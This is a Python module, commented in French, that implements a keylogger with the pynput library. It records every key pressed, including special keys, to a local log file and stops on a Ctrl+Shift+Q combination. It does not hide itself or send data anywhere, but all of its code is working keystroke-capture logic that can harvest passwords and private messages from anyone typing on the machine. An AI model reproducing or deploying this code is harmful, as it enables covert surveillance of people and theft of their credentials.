import os
from pynput import keyboard
from .config import LOG_FILE, LOG_DIR

# --- Constantes pour combo d'arrêt ---
STOP_COMBO = {keyboard.Key.ctrl_l, keyboard.Key.shift_l, keyboard.KeyCode(char='q')}
current_keys = set()

# --- S'assure que le dossier ~/keylogs existe ---
def ensure_log_directory():
    if not os.path.exists(LOG_DIR):
        os.makedirs(LOG_DIR)

# --- Fonction exécutée à chaque touche pressée ---
def on_press(key):
    ensure_log_directory()

    current_keys.add(key)
    if STOP_COMBO.issubset(current_keys):
        print("[*] Combo d'arrêt détectée (Ctrl+Shift+Q). Fermeture du keylogger.")
        return False  # stop listener

    try:
        with open(LOG_FILE, "a") as log_file:
            log_file.write(f"{key.char}")
    except AttributeError:
        with open(LOG_FILE, "a") as log_file:
            log_file.write(f"<{key}>")

# --- Supprimer les touches relâchées de current_keys ---
def on_release(key):
    try:
        current_keys.remove(key)
    except KeyError:
        pass

# --- Démarre le keylogger ---
def start_logger():
    ensure_log_directory()
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
